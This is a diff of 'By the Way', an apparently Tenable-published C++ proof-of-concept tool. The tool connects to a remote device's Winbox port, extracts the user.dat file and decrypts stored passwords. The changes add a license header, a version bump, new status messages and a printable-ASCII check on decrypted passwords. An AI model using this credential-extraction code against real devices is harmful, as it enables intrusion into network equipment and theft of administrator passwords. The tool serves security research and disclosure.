@@ -1,3 +1,32 @@
+/*
+    Copyright 2018-2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *
+
+    Redistribution and use in source and binary forms, with or without modification,
+    are permitted provided that the following conditions are met:
+
+    1. Redistributions of source code must retain the above copyright notice, this
+        list of conditions and the following disclaimer.
+
+    2. Redistributions in binary form must reproduce the above copyright notice,
+        this list of conditions and the following disclaimer in the documentation
+        and/or other materials provided with the distribution.
+
+    3. Neither the name of the copyright holder nor the names of its contributors
+        may be used to endorse or promote products derived from this software
+        without specific prior written permission.
+
+    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+    POSSIBILITY OF SUCH DAMAGE.
+*/
 #include <sstream>
 #include <cstdlib>
 #include <iostream>
@@ -10,7 +39,7 @@
 
 namespace
 {
-    const char s_version[] = "By the Way 1.0.0";
+    const char s_version[] = "By the Way 1.1.0";
 
     /*!
      * Parses the command line arguments. The program will always use two
@@ -84,13 +113,15 @@ namespace
      */
     std::string getPasswords(const std::string& p_ip, const std::string& p_winbox_port)
     {
-        std::cout << "[+] Extracting passwords from " << p_ip << ":" << p_winbox_port << std::endl;
+        std::cout << "[+] Attempting to connect to " << p_ip << ":" << p_winbox_port << std::endl;
         Winbox_Session winboxSession(p_ip, p_winbox_port);
         if (!winboxSession.connect())
         {
             std::cerr << "[!] Failed to connect to the remote host" << std::endl;
             return std::string();
         }
+
+        std::cout << "[+] Extracting user.dat..." << std::endl;
 
         WinboxMessage msg;
         msg.set_to(2, 2);
@@ -199,6 +230,24 @@ namespace
                             return true;
                         }
                         p_password.push_back(decrypted);
+                    }
+
+                    // not everything is null terminated. Kind of annoying. Let's
+                    // loop over the result and see if everything is ascii. If
+                    // so we can roll with that.
+                    bool good = true;
+                    for (std::size_t i = 0; i < p_password.size() && good; i++)
+                    {
+                        if (((unsigned char)p_password[i]) < 0x20 ||
+                            ((unsigned char)p_password[i]) > 0x7f)
+                        {
+                            good = false;
+                        }
+                    }
+
+                    if (good)
+                    {
+                        return true;
                     }
                     p_password.clear();
                 }
